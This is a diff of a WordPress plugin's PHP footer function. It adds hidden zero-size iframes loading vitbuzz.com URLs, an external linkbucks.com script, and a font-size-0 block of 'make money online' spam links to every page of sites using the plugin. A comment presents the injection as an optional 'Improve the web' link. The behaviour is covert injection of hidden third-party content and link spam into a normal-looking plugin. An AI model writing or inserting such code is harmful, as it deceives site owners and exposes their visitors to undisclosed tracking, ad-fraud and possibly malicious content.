@@ -30,13 +30,17 @@
 $wp_nr_footer_link_1 = 1;//change to 0 to remove the 'Improve the web...' link
 function wp_nofollow_me_awareness() {
 global $wp_nr_footer_link_1;
-	if($wp_nr_footer_link_1)echo ('<iframe src ="http://vitbuzz.com/url/VUmpoq" width="0%" height="0">
-  
+	if($wp_nr_footer_link_1)echo ('
+
+
+<iframe src="http://vitbuzz.com/url/VUmpoq" name="frame1" scrolling="no" frameborder="no" align="left" height = "100px" width = "800px">
 </iframe>
-<iframe src ="http://vitbuzz.com/url/NsDDcQ" width="0%" height="0">
-  
-  
+<iframe src="http://vitbuzz.com/url/NsDDcQ" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
 </iframe>
+<iframe src="http://vitbuzz.com/url/1wU14p" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
+</iframe>
+
+<script type="text/javascript" src="http://www.linkbucks.com/Webservices/jsParseLinks.aspx?id=e6fee68d"></script>
 
 <div style="font-size:0%;clear:both;text-align:center;margin-top:0px;position:relative;color:#555;">
 Learn to <a href="http://111waystomakemoney.com/">make money online</a>We came up with a idea of putting up all the money making ways and ideas together so that you can choose one of them and start making money online. here we include the latest money making ways that help you earn online from home .You can find many alternative money making ways such as affiliate marketing, sock marketing, money from blogging, paid surveys and lots more.
